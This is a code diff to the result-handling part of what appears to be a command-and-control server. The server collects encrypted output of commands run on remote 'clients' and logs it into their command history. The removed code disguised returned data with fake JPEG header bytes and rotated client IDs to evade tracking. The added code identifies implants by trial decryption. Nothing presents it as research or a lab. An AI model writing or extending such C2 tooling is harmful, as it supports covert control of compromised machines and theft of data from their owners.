@@ -26,66 +26,44 @@ class ResultHandler(BaseHandler):
             # Parse the request body JSON
             body_data = json.loads(request_body)
             
-            # Extract client ID and data from the request body
-            client_id = body_data.get('client_id')
+            # Get encrypted data
             encrypted_data = body_data.get('data')
             
-            if not client_id:
-                self.log_message(f"No client ID provided in request from {self.client_address[0]}")
-                self.send_error_response(400, "Missing client ID")
+            if not encrypted_data:
+                self.log_message(f"No data provided in request from {self.client_address[0]}")
+                self.send_error_response(400, "Missing data")
+                return
+                
+            # For backward compatibility - if client_id is provided
+            provided_client_id = body_data.get('client_id')
+            
+            # Identify client by key-based decryption
+            client_id, decrypted_data = self.crypto_helper.identify_client_by_decryption(encrypted_data)
+            
+            # If decryption-based ID failed but client_id was provided
+            if client_id is None and provided_client_id:
+                client_id = provided_client_id
+                self.log_message(f"Using provided client ID: {client_id} due to decryption failure")
+                
+                # Try decryption with the provided client ID
+                try:
+                    decrypted_data = self.crypto_helper.decrypt(encrypted_data, client_id)
+                except Exception as e:
+                    self.log_message(f"Decryption failed with provided client ID: {e}")
+            
+            if client_id is None and decrypted_data is None:
+                self.log_message(f"Could not identify client - authentication failed")
+                self.send_error_response(400, "Authentication failed")
                 return
                 
             self.log_message(f"Identified client from result: {client_id}")
             
-            # Find the original client ID if this is a rotated ID
-            original_client_id = self.client_manager.get_original_client_id(client_id)
-            if original_client_id != client_id:
-                self.log_message(f"Mapped rotated client ID {client_id} to original ID {original_client_id}")
-                client_id = original_client_id
-            
             # Process the result
             try:
-                result_data = None
+                result_data = decrypted_data
                 is_structured = False
                 timestamp = None
                 result = None
-                
-                # Try to decrypt the data
-                try:
-                    # Check for JPEG header in binary format before trying to decrypt
-                    if encrypted_data and isinstance(encrypted_data, str):
-                        # Try to decode as base64 first
-                        try:
-                            decoded_data = base64.b64decode(encrypted_data)
-                            # Check for JPEG header bytes (0xFF 0xD8 0xFF)
-                            if len(decoded_data) > 3 and decoded_data[0] == 0xFF and decoded_data[1] == 0xD8 and decoded_data[2] == 0xFF:
-                                # Remove the JPEG header (first 3 bytes)
-                                decoded_data = decoded_data[3:]
-                                self.log_message(f"Removed binary JPEG header from result data")
-                                
-                                # Re-encode to base64 for decryption
-                                encrypted_data = base64.b64encode(decoded_data).decode('utf-8')
-                        except Exception as e:
-                            # If not valid base64 or no JPEG header, check for text-based headers
-                            if encrypted_data.startswith("0xFFD8FF"):
-                                encrypted_data = encrypted_data[8:]  # Remove the exact 8 characters
-                                self.log_message(f"Removed text JPEG header '0xFFD8FF' from result data")
-                            elif encrypted_data.startswith("FFD8FF"):
-                                encrypted_data = encrypted_data[6:]  # Remove the exact 6 characters
-                                self.log_message(f"Removed text JPEG header 'FFD8FF' from result data")
-                    
-                    # Decrypt using client's key if available
-                    if encrypted_data and self.crypto_helper._has_unique_key(client_id):
-                        result_data = self.crypto_helper.decrypt(encrypted_data, client_id)
-                    elif encrypted_data:
-                        result_data = self.crypto_helper.decrypt(encrypted_data)
-                    else:
-                        result_data = "No data provided"
-                        
-                    self.log_message(f"Successfully decrypted result data: {result_data[:100]}...")
-                except Exception as e:
-                    self.log_message(f"Decryption failed, using data as-is: {str(e)}")
-                    result_data = encrypted_data
                 
                 # Try to parse as JSON
                 try:
@@ -96,17 +74,6 @@ class ResultHandler(BaseHandler):
                             is_structured = True
                             timestamp = result_json['timestamp']
                             result = result_json['result']
-                            
-                            # Also check for rotated client ID in the result
-                            if 'client_id' in result_json and result_json['client_id'] != client_id:
-                                received_client_id = result_json['client_id']
-                                self.log_message(f"Client reported ID {received_client_id} in result differs from tracked ID {client_id}")
-                                
-                                # Update mapping if this is a newly rotated ID
-                                current_id = self.client_manager.get_current_client_id(client_id)
-                                if current_id != received_client_id:
-                                    self.log_message(f"Updating client ID mapping from {current_id} to {received_client_id}")
-                                    self.client_manager.update_client_id_mapping(client_id, received_client_id)
                 except json.JSONDecodeError:
                     # Not JSON, use as raw result
                     self.log_message(f"Data is not valid JSON, using as raw result")
@@ -115,22 +82,6 @@ class ResultHandler(BaseHandler):
                 # Process structured result if parsed successfully
                 if is_structured and timestamp and result:
                     self.log_message(f"Processing structured result for timestamp {timestamp}")
-                    
-                    # Check if this is a result for a client_id_rotation command
-                    # Find the original command to check its type
-                    original_command_type = None
-                    if client_id in self.client_manager.clients:
-                        for cmd in self.client_manager.clients[client_id]["history"]:
-                            if cmd.get("timestamp") == timestamp:
-                                original_command_type = cmd.get("command_type")
-                                break
-                    
-                    # If this was a rotation command that succeeded, clear the rotation_commands_sent counter
-                    if original_command_type == "client_id_rotation" and "success" in result.lower():
-                        if client_id in self.client_manager.clients:
-                            # Reset the counter for successful rotations
-                            self.client_manager.clients[client_id]['rotation_commands_sent'] = 0
-                            self.log_message(f"Client ID rotation successfully applied for {client_id}")
                     
                     # Add the result to the command history
                     success = self.client_manager.add_command_result(client_id, timestamp, result)
